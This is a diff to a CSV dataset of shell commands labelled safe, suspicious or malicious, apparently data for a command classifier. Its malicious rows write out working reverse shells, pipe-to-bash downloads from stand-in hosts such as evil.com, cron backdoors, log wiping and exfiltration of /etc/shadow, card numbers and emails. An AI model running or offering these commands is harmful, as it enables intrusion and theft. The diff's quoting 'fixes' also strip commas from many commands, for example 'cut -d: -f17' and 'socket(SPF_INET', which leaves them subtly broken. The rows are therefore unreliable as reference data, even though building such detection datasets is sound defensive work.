@@ -136,7 +136,7 @@ id,command,classification
 135,tar -tvf archive.tar; gzip -l archive.gz,safe
 136,ls -la /var/spool/cron/crontabs,safe
 137,ssh-keygen -t rsa; cat ~/.ssh/id_rsa.pub,safe
-138,cut -d: -f1,"7 /etc/passwd | sort,safe"
+138,cut -d: -f17 /etc/passwd | sort,safe
 139,sudo lsof -i :22; sudo fuser 80/tcp,safe
 140,cd /var/log/apache2; ls -la *.log,safe
 141,apt list --installed | grep php,safe
@@ -144,7 +144,7 @@ id,command,classification
 143,"tee logfile.txt <<< ""test data""",safe
 144,env | grep -i path,safe
 145,cd /etc/apache2; ls -la sites-*,safe
-146,ps aux | awk '{print $2,"$4,$11}' | sort -k2rn | head -10,safe"
+146,"ps aux | awk '{print $2$4,$11}' | sort -k2rn | head -10",safe
 147,"cd /; find . -name ""passwd"" 2>/dev/null",safe
 148,df -ih; du -h --max-depth=1 /var,safe
 149,whois example.com; ping -c 4 8.8.8.8,safe
@@ -178,7 +178,7 @@ id,command,classification
 177,grep -r DocumentRoot /etc/apache2,safe
 178,htpasswd -c /etc/apache2/.htpasswd user,safe
 179,cd /etc/apt/sources.list.d; ls -la,safe
-180,curl -s https://api.weather.gov/points/39.7456,"-97.0892,safe"
+180,curl -s https://api.weather.gov/points/39.7456-97.0892,safe
 181,logrotate -f /etc/logrotate.conf,safe
 182,cd /proc; ls -la | grep ^d | head,safe
 183,cd /boot; ls -la vmlinuz*,safe
@@ -220,7 +220,7 @@ id,command,classification
 219,cat /var/log/secure; cat /var/log/auth.log,suspicious
 220,"find /home -name ""authorized_keys"" -type f",suspicious
 221,ls -la /var/spool/cron/*; cat /var/spool/cron/root,suspicious
-222,ps -eo pid,"user,cmd; ps auxwww,suspicious"
+222,"ps -eo piduser,cmd; ps auxwww",suspicious
 223,curl -s ifconfig.me/ip; wget -qO- ifconfig.me/ip,suspicious
 224,curl -s https://ipinfo.io/ip; wget -qO- https://ipinfo.io/ip,suspicious
 225,echo $PATH; which ls cat ps netstat find,suspicious
@@ -279,7 +279,7 @@ id,command,classification
 278,cat /etc/skel/.bash*; cat /etc/profile.d/*,suspicious
 279,"find /var/www -name ""config.inc.php"" 2>/dev/null",suspicious
 280,"awk -F: '($3 < 1000) {print $1 "":"" $3}' /etc/passwd",suspicious
-281,mount -o remount,"rw /; mount -o remount,exec /tmp,suspicious"
+281,"mount -o remountrw /; mount -o remount,exec /tmp",suspicious
 282,cat /proc/sched_debug | head -n 30,suspicious
 283,"find / -path ""*/log/auth.log*"" -type f -exec tail -n 50 {} \;",suspicious
 284,"cat /etc/securetty; find /etc -name ""sshd*"" -type f",suspicious
@@ -297,7 +297,7 @@ id,command,classification
 296,cat /etc/security/access.conf; cat /etc/security/limits.conf,suspicious
 297,"find /etc -path ""*/php.ini"" -type f -exec grep -l allow_url_include {} \;",suspicious
 298,"grep -r ""StrictHostKeyChecking"" /etc /home",suspicious
-299,cat /etc/*-release; cat /etc/issue{,".net},suspicious"
+299,cat /etc/*-release; cat /etc/issue{.net},suspicious
 300,"find / -path ""*/config/database.php"" 2>/dev/null",suspicious
 301,nc -e /bin/sh attacker.com 4444,malicious
 302,curl -s hxxp://evil.com/script.sh | bash,malicious
@@ -312,14 +312,14 @@ id,command,classification
 311,chown root:root /tmp/rootkit; chmod 4755 /tmp/rootkit,malicious
 312,"echo ""nameserver 8.8.8.8"" > /etc/resolv.conf; dig malicious.com",malicious
 313,"base64 -d <<< ""cGFzc3dvcmRzdGVhbGVyLnB5"" | python",malicious
-314,socat exec:'bash -li',"tcp:attacker.com:4444,malicious"
+314,socat exec:'bash -li'tcp:attacker.com:4444,malicious
 315,"echo ""ssh-rsa AAAAB...snip... attacker@evil"" >> ~/.ssh/authorized_keys",malicious
 316,cd /tmp; cd $RANDOM; curl hxxp://malicious.com/backdoor.elf > .a,malicious
 317,cp /bin/bash /tmp/.hidden; chmod 4755 /tmp/.hidden,malicious
 318,"echo ""* * * * * curl -s hxxp://c2.com/check | bash"" > /var/spool/cron/root",malicious
 319,zip -r /tmp/stolen_data.zip /home/*/Documents,malicious
 320,"curl -X POST -d ""$(cat /etc/passwd)"" hxxp://datastealer.com/exfil",malicious
-321,"perl -e 'use Socket;$i=""10.0.0.1"";$p=1234;socket(S","PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};',malicious"
+321,"perl -e 'use Socket;$i=""10.0.0.1"";$p=1234;socket(SPF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",malicious
 322,"echo ""wget -q -O- hxxp://attacker.com/shell.php | php"" > /etc/rc.local",malicious
 323,wget -O /tmp/.s hxxp://malicious.com/r.txt; chmod +x /tmp/.s; /tmp/.s,malicious
 324,mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc attacker.com 4444 1>/tmp/backpipe,malicious
@@ -327,12 +327,12 @@ id,command,classification
 326,gcc -o /tmp/rootshell /tmp/exploit.c; chmod +s /tmp/rootshell,malicious
 327,rm -f /var/log/auth.log; ln -sf /dev/null /var/log/auth.log,malicious
 328,"curl -s hxxp://attacker.com/payload | python -c ""import pty;pty.spawn('/bin/bash')""",malicious
-329,"php -r '$sock=fsockopen(""10.0.0.1""","4242);exec(""/bin/sh -i <&3 >&3 2>&3"");',malicious"
+329,"php -r '$sock=fsockopen(""10.0.0.1""4242);exec(""/bin/sh -i <&3 >&3 2>&3"");'",malicious
 330,sed -i 's/AllowUsers user1/AllowUsers user1 hacker/' /etc/ssh/sshd_config,malicious
 331,tar -czf - /etc | openssl enc -e -aes256 -out /tmp/data.enc; scp /tmp/data.enc attacker@evil.com:~,malicious
 332,cd /tmp; curl -sO hxxp://malware.com/crypto.py; python3 crypto.py --encrypt /home,malicious
 333,"crontab -r; echo ""*/1 * * * * /tmp/.backdoor"" | crontab -",malicious
-334,"find /var/www -name ""wp-config.php"" -type f -exec sed -i ""s/define('DB_PASSWORD'"," '.*')/define('DB_PASSWORD', 'hacked')/"" {} \;,malicious"
+334,"find /var/www -name ""wp-config.php"" -type f -exec sed -i ""s/define('DB_PASSWORD' '.*')/define('DB_PASSWORD', 'hacked')/"" {} \;",malicious
 335,grep -o '[0-9]\{16\}' /var/www/html/*.php | curl -d @- hxxp://ccleak.com,malicious
 336,openssl enc -aes-256-cbc -salt -in /etc/shadow -out /tmp/shadow.enc; scp /tmp/shadow.enc user@attacker.com:~,malicious
 337,"setcap cap_setuid+ep /usr/bin/python3.9; python3.9 -c 'import os;os.setuid(0);os.system(""/bin/bash"")'",malicious
@@ -357,7 +357,7 @@ id,command,classification
 356,"find /home -name ""*.jpg"" -exec curl -F ""file=@{}"" hxxp://data-exfil.com/upload \;",malicious
 357,"apt-get update -o APT::Update::Pre-Invoke=""wget -O- hxxp://malware.site | bash""",malicious
 358,cd /tmp; nohup ./cryptominer -a cryptonight -o stratum+tcp://pool.com:3333 -u wallet -p x &,malicious
-359,mount -t cifs //evil.com/share /mnt -o user=user,"pass=pass; cp /etc/shadow /mnt/,malicious"
+359,mount -t cifs //evil.com/share /mnt -o user=userpass=pass; cp /etc/shadow /mnt/,malicious
 360,cd /; find . -type f -size -100k 2>/dev/null | xargs grep -l password | xargs cat | curl -d @- hxxp://pwn.com,malicious
-361,cd /var/mail; grep -r -E -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,"6}\b' * | curl -d @- hxxp://mail-steal.com,malicious"
+361,cd /var/mail; grep -r -E -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{26}\b' * | curl -d @- hxxp://mail-steal.com,malicious
 362,"curl -s hxxp://evil.com/agent.sh | sh; echo ""*/30 * * * * curl -s hxxp://evil.com/check.sh | sh"" | crontab -",malicious
